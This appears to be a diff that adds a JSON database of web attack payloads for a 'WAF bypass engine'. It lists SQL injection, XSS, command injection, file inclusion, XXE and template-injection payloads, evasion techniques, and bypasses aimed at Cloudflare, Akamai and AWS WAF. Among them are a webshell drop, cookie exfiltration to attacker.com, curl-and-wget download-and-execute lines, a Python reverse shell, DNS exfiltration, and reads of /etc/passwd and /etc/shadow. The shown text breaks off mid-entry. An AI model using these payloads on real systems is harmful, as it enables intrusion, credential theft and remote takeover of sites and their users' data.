@@ -1,0 +1,1062 @@
+{
+  "version": "1.0.0",
+  "description": "WAF bypass payload database for UniVex WAF Bypass Engine",
+  "last_updated": "2026-03-01",
+  "categories": {
+    "sqli": {
+      "description": "SQL Injection payloads for extracting data, authentication bypass, and blind detection",
+      "payloads": [
+        {
+          "payload": "' OR '1'='1",
+          "description": "Classic authentication bypass via always-true condition",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND SLEEP(5)--",
+          "description": "Time-based blind SQLi delay probe for MySQL",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+          "description": "Subquery-wrapped time-based blind SQLi for WAF evasion",
+          "technique": "subquery_wrapping",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "1 UNION SELECT NULL,NULL,NULL--",
+          "description": "UNION-based column count enumeration",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' ORDER BY 1--",
+          "description": "ORDER BY clause for column count detection (error-based)",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
+          "description": "MSSQL error-based table name extraction via type conversion error",
+          "technique": "error_based",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+          "description": "MySQL error-based extraction using EXTRACTVALUE",
+          "technique": "error_based",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1';WAITFOR DELAY '0:0:5'--",
+          "description": "MSSQL time-based blind SQLi using WAITFOR DELAY",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND (SELECT 1 FROM pg_sleep(5))--",
+          "description": "PostgreSQL time-based blind SQLi using pg_sleep",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND LOAD_FILE('/etc/passwd')--",
+          "description": "MySQL file read via LOAD_FILE function",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f706870 73797374656d28245f4745545b2263225d293b3f3e--",
+          "description": "MySQL file write via INTO OUTFILE for webshell drop",
+          "technique": "hex_encoding",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1'/**/UNION/**/SELECT/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables--",
+          "description": "UNION injection with inline comment spacing to bypass keyword filters",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' /*!UNION*/ /*!SELECT*/ user(),2,3--",
+          "description": "MySQL conditional comment execution to bypass WAF keyword matching",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))>64--",
+          "description": "Boolean-based blind SQLi character extraction via ASCII comparison",
+          "technique": "boolean_blind",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--",
+          "description": "CASE WHEN conditional boolean blind with division-by-zero error branch",
+          "technique": "boolean_blind",
+          "severity": "high",
+          "target": "query_string"
+        }
+      ]
+    },
+    "xss": {
+      "description": "Cross-Site Scripting payloads for reflected, stored, and DOM-based XSS attacks",
+      "payloads": [
+        {
+          "payload": "<script>alert(1)</script>",
+          "description": "Basic reflected XSS alert payload",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "description": "IMG tag onerror event handler XSS",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "<svg/onload=alert(1)>",
+          "description": "SVG onload event for XSS, bypasses img/script tag filters",
+          "technique": "tag_switching",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "<body onload=alert(document.cookie)>",
+          "description": "Body tag onload for cookie theft",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "body"
+        },
+        {
+          "payload": "javascript:alert(1)",
+          "description": "JavaScript pseudo-protocol in href/src attributes",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "description": "Input autofocus with onfocus event, no user interaction needed",
+          "technique": "tag_switching",
+          "severity": "medium",
+          "target": "body"
+        },
+        {
+          "payload": "<details open ontoggle=alert(1)>",
+          "description": "HTML5 details element ontoggle event, bypasses common tag blacklists",
+          "technique": "tag_switching",
+          "severity": "medium",
+          "target": "body"
+        },
+        {
+          "payload": "<math><mtext></table></math><svg onload=alert(1)>",
+          "description": "Parser confusion with MathML to break out of table context for XSS",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "body"
+        },
+        {
+          "payload": "<iframe src=\"javascript:alert`1`\">",
+          "description": "Iframe with JavaScript protocol using template literal to bypass quote filters",
+          "technique": "none",
+          "severity": "medium",
+          "target": "body"
+        },
+        {
+          "payload": "<a href=javascript://%0Aalert(1)>click</a>",
+          "description": "URL-encoded newline in javascript: URL to bypass pattern matching",
+          "technique": "url_encoding",
+          "severity": "medium",
+          "target": "body"
+        },
+        {
+          "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+          "description": "String.fromCharCode obfuscation of alert(1) to bypass string-based filters",
+          "technique": "char_code_encoding",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "<ScRiPt>alert(1)</ScRiPt>",
+          "description": "Mixed-case tag to evade case-sensitive filters",
+          "technique": "case_variation",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "'\"><img src=1 onerror=alert(1)>",
+          "description": "Attribute breakout with quote injection before XSS payload",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
+          "description": "HTML entity encoded alert(1) inside event handler",
+          "technique": "html_entity",
+          "severity": "medium",
+          "target": "body"
+        },
+        {
+          "payload": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
+          "description": "Cookie exfiltration via fetch() to attacker-controlled server",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        }
+      ]
+    },
+    "rce": {
+      "description": "Remote Code Execution payloads targeting OS command injection and code evaluation vulnerabilities",
+      "payloads": [
+        {
+          "payload": "; id",
+          "description": "Basic Unix command injection using semicolon separator",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "| id",
+          "description": "Pipe-based Unix command injection",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "$(id)",
+          "description": "Command substitution for bash command injection",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "`id`",
+          "description": "Backtick command substitution for command injection",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "&& cat /etc/passwd",
+          "description": "AND-chained command injection to read /etc/passwd",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "|| curl http://attacker.com/shell.sh | bash",
+          "description": "OR-chained command injection to download and execute a remote shell",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": ";{cat,/etc/passwd}",
+          "description": "Brace expansion command injection to bypass space-filtering WAFs",
+          "technique": "space_bypass",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": ";ca''t /etc/passwd",
+          "description": "Empty-string insertion in command name to bypass string-matching",
+          "technique": "string_concatenation",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "ping -c 1 $(cat /etc/hostname).attacker.com",
+          "description": "DNS exfiltration of hostname via ping command substitution",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "wget http://attacker.com/rshell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh",
+          "description": "Download and execute reverse shell via wget",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+          "description": "Python3 reverse shell one-liner",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": ";$IFS$9cat$IFS$9/etc/passwd",
+          "description": "IFS variable abuse for space bypass in bash command injection",
+          "technique": "space_bypass",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "1;echo${IFS}bWtkaXIgL3RtcC90ZXN0|base64${IFS}-d|bash",
+          "description": "Base64-encoded command with IFS space bypass for WAF evasion",
+          "technique": "base64_encoding",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "a;s=cat;t=/etc/passwd;$s$IFS$t",
+          "description": "Variable assignment command construction to bypass keyword filters",
+          "technique": "string_concatenation",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": ";nslookup `whoami`.attacker.com",
+          "description": "DNS exfiltration of whoami output via nslookup",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        }
+      ]
+    },
+    "lfi": {
+      "description": "Local File Inclusion payloads for reading sensitive files through path traversal",
+      "payloads": [
+        {
+          "payload": "../../../../etc/passwd",
+          "description": "Classic path traversal to /etc/passwd",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "....//....//....//etc/passwd",
+          "description": "Double-slash path traversal to bypass simple ../ filters",
+          "technique": "path_traversal_variation",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "description": "URL-encoded path traversal",
+          "technique": "url_encoding",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "description": "Fully URL-encoded path traversal including dots",
+          "technique": "double_url_encoding",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+          "description": "Double URL-encoded path traversal (%25 = %)",
+          "technique": "double_url_encoding",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
+          "description": "PHP stream wrapper for base64-encoded file read",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "php://input",
+          "description": "PHP input stream wrapper for code execution via POST body",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+          "description": "PHP data:// stream wrapper with base64 webshell for RCE",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "/proc/self/environ",
+          "description": "Read process environment variables (may contain secrets)",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "/proc/self/fd/0",
+          "description": "Read process file descriptor (stdin) for log poisoning",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string"
+        },
+        {
+          "payload": "....\\....\\....\\....\\windows\\win.ini",
+          "description": "Windows path traversal variant using backslash",
+          "technique": "path_traversal_variation",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "../../../../etc/passwd%00",
+          "description": "Null byte injection to truncate extension suffix (.php, .txt) in old PHP",
+          "technique": "null_byte",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "expect://id",
+          "description": "PHP expect:// stream wrapper for command execution (requires expect extension)",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "/var/log/nginx/access.log",
+          "description": "Log poisoning target — inject PHP code in User-Agent, then include log file",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "../../../../../../../../../../../etc/shadow",
+          "description": "Deep path traversal to /etc/shadow for password hash extraction",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        }
+      ]
+    },
+    "xxe": {
+      "description": "XML External Entity injection payloads for file read, SSRF, and DoS via XML parsers",
+      "payloads": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+          "description": "Classic XXE for /etc/passwd file read",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/'>]><root>&xxe;</root>",
+          "description": "XXE-based SSRF to attacker's server for out-of-band data exfiltration",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]><data>&send;</data>",
+          "description": "Blind XXE via external DTD for out-of-band exfiltration",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+          "description": "Billion laughs DoS attack via exponential entity expansion",
+          "technique": "none",
+          "severity": "high",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><root>&xxe;</root>",
+          "description": "Windows XXE file read for win.ini",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> ]><test>&xxe;</test>",
+          "description": "XXE with PHP filter wrapper for base64-encoded file read",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+          "description": "XInclude-based file read bypassing DOCTYPE-blocking WAF rules",
+          "technique": "tag_switching",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>\">%wrapper;]><root>&send;</root>",
+          "description": "Parameter entity chaining for blind XXE data exfiltration via HTTP",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<!DOCTYPE test SYSTEM \"http://attacker.com/evil.dtd\">",
+          "description": "Minimal DOCTYPE with external DTD reference for blind XXE trigger",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'netdoc:///etc/passwd'>]><root>&xxe;</root>",
+          "description": "NetDoc protocol variant for Java-based XML parser XXE",
+          "technique": "php_wrapper",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\" encoding=\"utf-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+          "description": "UTF-16 encoded XXE to bypass UTF-8 pattern matching WAF rules",
+          "technique": "unicode_normalization",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'gopher://127.0.0.1:6379/_FLUSHALL%0d%0a'>]><root>&xxe;</root>",
+          "description": "Gopher protocol XXE for SSRF to internal Redis server",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        }
+      ]
+    },
+    "ssti": {
+      "description": "Server-Side Template Injection payloads for detecting and exploiting template engines",
+      "payloads": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Jinja2/Twig/Freemarker SSTI detection via arithmetic expression",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "${7*7}",
+          "description": "Freemarker/Java EL SSTI detection expression",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "#{7*7}",
+          "description": "Ruby ERB/Slim SSTI detection expression",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+          "description": "Python Jinja2 SSTI file read via MRO chain traversal",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+          "description": "Jinja2 RCE via config object globals access to os.popen",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
+          "description": "Jinja2 RCE via subclass iteration to find warnings module for os import",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+          "description": "Freemarker SSTI RCE via Execute utility class instantiation",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+          "description": "Freemarker assign directive for RCE",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        },
+        {
+          "payload": "{{settings.SECRET_KEY}}",
+          "description": "Django template SSTI to leak SECRET_KEY from settings",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+          "description": "Spring SpEL SSTI RCE via Runtime.exec()",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
+          "description": "Jinja2 subclass enumeration for gadget hunting",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string"
+        },
+        {
+          "payload": "<%= 7 * 7 %>",
+          "description": "ERB (Ruby on Rails) SSTI detection",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "<%= `id` %>",
+          "description": "ERB template RCE via backtick command execution",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+          "description": "Handlebars.js SSTI RCE via constructor chain",
+          "technique": "none",
+          "severity": "critical",
+          "target": "query_string"
+        },
+        {
+          "payload": "{php}echo shell_exec('id');{/php}",
+          "description": "Smarty PHP tag SSTI RCE via {php} tag (older Smarty versions)",
+          "technique": "none",
+          "severity": "critical",
+          "target": "body"
+        }
+      ]
+    }
+  },
+  "techniques": {
+    "double_url_encoding": {
+      "description": "Encodes characters twice so that the WAF decodes once and sees safe text, while the application decodes twice and executes the payload. The % character is encoded as %25, converting %3C to %253C.",
+      "example_before": "<script>alert(1)</script>",
+      "example_after": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "applicable_to": ["xss", "sqli", "lfi", "rce"]
+    },
+    "unicode_normalization": {
+      "description": "Uses Unicode equivalent characters (full-width, overlong UTF-8, or lookalike codepoints) that normalize to ASCII equivalents in the application but are not matched by WAF signatures operating on byte patterns.",
+      "example_before": "' OR 1=1--",
+      "example_after": "\uff07 \uff2f\uff32 \uff11\uff1d\uff11--",
+      "applicable_to": ["sqli", "xss", "rce", "lfi"]
+    },
+    "html_entity": {
+      "description": "Encodes characters as HTML entities (named, decimal, or hex) that browsers decode before processing but WAFs may not evaluate in the same context. Effective in HTML attribute and JavaScript contexts.",
+      "example_before": "<img src=x onerror=alert(1)>",
+      "example_after": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+      "applicable_to": ["xss"]
+    },
+    "comment_injection": {
+      "description": "Inserts SQL or code comments (/**/, --, #, /*!*/) between keywords and tokens to fragment signatures while keeping the payload syntactically valid. MySQL conditional comments (/*!...*/) are especially powerful as they are executed by MySQL but look like comments to other parsers.",
+      "example_before": "UNION SELECT",
+      "example_after": "UNION/**/SELECT",
+      "applicable_to": ["sqli"]
+    },
+    "case_variation": {
+      "description": "Alternates upper and lower case letters in keywords to defeat case-sensitive regex patterns. Most SQL databases and JavaScript engines are case-insensitive for keywords and functions.",
+      "example_before": "SELECT",
+      "example_after": "SeLeCt",
+      "applicable_to": ["sqli", "xss", "rce"]
+    },
+    "null_byte": {
+      "description": "Inserts a URL-encoded null byte (%00) to terminate strings early in C-based parsers or to truncate file extensions in older PHP versions, causing the WAF and application to interpret strings differently.",
+      "example_before": "../../../../etc/passwd.php",
+      "example_after": "../../../../etc/passwd%00.php",
+      "applicable_to": ["lfi", "sqli"]
+    },
+    "parameter_pollution": {
+      "description": "Sends the same parameter multiple times with different values (HTTP Parameter Pollution, HPP). WAFs may inspect only the first occurrence while the application uses the last, or vice versa, allowing a split payload to bypass detection.",
+      "example_before": "?id=1 UNION SELECT",
+      "example_after": "?id=1&id=UNION SELECT",
+      "applicable_to": ["sqli", "xss", "rce"]
+    },
+    "chunked_transfer": {
+      "description": "Uses HTTP chunked transfer encoding to split the request body into chunks. Some WAFs reassemble incorrectly or inspect each chunk independently, allowing payloads split across chunk boundaries to bypass signature matching.",
+      "example_before": "POST /login body: username=admin'--",
+      "example_after": "POST /login with Transfer-Encoding: chunked; body split as '5\\r\\nadmin\\r\\n3\\r\\n'--\\r\\n0\\r\\n'",
+      "applicable_to": ["sqli", "xss", "rce", "lfi"]
+    },
+    "http_method_switching": {
+      "description": "Switches the HTTP method (GET→POST, POST→PUT, or using method override headers like X-HTTP-Method-Override) to bypass WAF rules that only apply to specific methods or inspect query strings but not body parameters.",
+      "example_before": "GET /search?q=<script>alert(1)</script>",
+      "example_after": "POST /search with body: q=<script>alert(1)</script> and header X-HTTP-Method-Override: GET",
+      "applicable_to": ["xss", "sqli", "rce", "lfi"]
+    },
+    "base64_encoding": {
+      "description": "Wraps the entire payload or parts of it in base64 encoding, which is then decoded by the application (e.g., eval(atob(...)) in JavaScript, base64_decode() in PHP). WAFs matching on plaintext signatures miss the encoded form.",
+      "example_before": "system('id')",
+      "example_after": "eval(base64_decode('c3lzdGVtKCdpZCcp'))",
+      "applicable_to": ["rce", "xss", "sqli"]
+    },
+    "wildcard_obfuscation": {
+      "description": "Uses shell glob wildcards to construct filenames and commands without typing the full string, bypassing keyword-based pattern matching in command injection filters. The shell expands wildcards before execution.",
+      "example_before": "cat /etc/passwd",
+      "example_after": "/bin/c?t /etc/pa??wd",
+      "applicable_to": ["rce", "lfi"]
+    },
+    "json_unicode_escape": {
+      "description": "Encodes characters within JSON string values as \\uXXXX Unicode escape sequences. JSON parsers decode these before the application processes the value, but WAFs scanning raw JSON body bytes may miss the payload.",
+      "example_before": "{\"username\": \"admin'--\"}",
+      "example_after": "{\"username\": \"\\u0061\\u0064\\u006d\\u0069\\u006e\\u0027\\u002d\\u002d\"}",
+      "applicable_to": ["sqli", "xss"]
+    },
+    "multipart_boundary_injection": {
+      "description": "Manipulates multipart/form-data boundary strings or field names to confuse WAF parsers that split on boundaries incorrectly, allowing payloads in field values to appear as boundary separators to the WAF but valid data to the server.",
+      "example_before": "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary",
+      "example_after": "Content-Type: multipart/form-data; boundary=----WebKit\\r\\nFormBoundary (with payload injected across the artificial split)",
+      "applicable_to": ["xss", "sqli", "rce"]
+    },
+    "content_type_confusion": {
+      "description": "Sends the payload with an unexpected Content-Type header (e.g., application/json when the WAF expects application/x-www-form-urlencoded) causing the WAF to parse the body differently than the application framework.",
+      "example_before": "POST with Content-Type: application/x-www-form-urlencoded and body: id=1'",
+      "example_after": "POST with Content-Type: application/json and body: {\"id\":\"1'\"}",
+      "applicable_to": ["sqli", "xss", "rce", "xxe", "ssti"]
+    }
+  },
+  "waf_specific": {
+    "cloudflare": {
+      "sqli": [
+        {
+          "payload": "1'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--",
+          "description": "Inline comment spacing to bypass Cloudflare's UNION SELECT detection",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Cloudflare's managed rules flag 'UNION SELECT' as a single token; comments fragment it"
+        },
+        {
+          "payload": "1' AND (SELECT 0x41 FROM users LIMIT 1)='A'--",
+          "description": "Hex literal comparison for boolean-based blind to avoid SELECT+column keywords",
+          "technique": "hex_encoding",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Cloudflare inspects payloads but hex literals often slip through"
+        },
+        {
+          "payload": "1';SELECT%09sleep(5)--",
+          "description": "Tab character (%09) as keyword separator to bypass space-based regex in Cloudflare",
+          "technique": "whitespace_variation",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Cloudflare normalizes spaces but %09 tab may not be caught in all rule sets"
+        },
+        {
+          "payload": "1' OR 0x31=0x31--",
+          "description": "Hex value comparison for always-true condition avoiding 1=1 signature",
+          "technique": "hex_encoding",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Avoids the classic '1'='1' OR signature"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<svg><animatetransform onbegin=alert(1)>",
+          "description": "SVG animatetransform onbegin event bypasses many Cloudflare XSS rules",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Cloudflare rules target common events; onbegin is less commonly blocked"
+        },
+        {
+          "payload": "<details/open/ontoggle=alert`1`>",
+          "description": "HTML5 details tag with template literal alert bypasses Cloudflare signature",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Template literals bypass parentheses checks; details/ontoggle avoids script tag filters"
+        },
+        {
+          "payload": "'\"><img src=x onerror=prompt`1`>",
+          "description": "Prompt with template literal in onerror to avoid alert() blocking",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string",
+          "notes": "Cloudflare sometimes blocks alert() specifically; prompt() is an alternative"
+        },
+        {
+          "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+          "description": "Polyglot XSS context-breaker covering title/style/textarea/script/xmp contexts",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Multi-context breakout increases chances of triggering in unknown render context"
+        }
+      ]
+    },
+    "akamai": {
+      "sqli": [
+        {
+          "payload": "1' AND '1'='1' AND SLEEP(0)--",
+          "description": "Zero-delay SLEEP call for detection while reducing anomaly score below Akamai threshold",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string",
+          "notes": "Akamai Kona uses anomaly scoring; lowering individual signal reduces total score"
+        },
+        {
+          "payload": "1/*!50000UNION*//*!50000SELECT*/NULL--",
+          "description": "MySQL conditional comment version bypass for Akamai UNION SELECT rule",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Akamai's Kona rule set targets UNION SELECT as a phrase; version comments split the token"
+        },
+        {
+          "payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "description": "UPDATEXML error-based extraction bypassing simpler Akamai SQLi keyword rules",
+          "technique": "error_based",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "UPDATEXML is sometimes less filtered than EXTRACTVALUE in Akamai rulesets"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<script/src=data:,alert(1)>",
+          "description": "Script tag with data: URI source bypassing Akamai's src attribute URL inspection",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Akamai may not inspect data: URI scheme as malicious in src attributes"
+        },
+        {
+          "payload": "<a href=\"&#106;avascript:alert(1)\">x</a>",
+          "description": "HTML entity encoding of 'j' in javascript: to bypass Akamai href inspection",
+          "technique": "html_entity",
+          "severity": "medium",
+          "target": "body",
+          "notes": "Entity encoding first letter evades string-prefix matching on javascript:"
+        }
+      ]
+    },
+    "aws_waf": {
+      "sqli": [
+        {
+          "payload": "1' UNION%23\nSELECT%23\nNULL,NULL,NULL--",
+          "description": "MySQL comment + URL-encoded newline to break UNION SELECT across lines, bypassing AWS WAF SQL rules",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "AWS WAF managed rules may not normalize %23 (hash) newlines before matching"
+        },
+        {
+          "payload": "1' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--",
+          "description": "Dual table reference in sleep to blend into normal query patterns for AWS WAF",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "FROM dual adds noise to the signature, reducing match confidence"
+        },
+        {
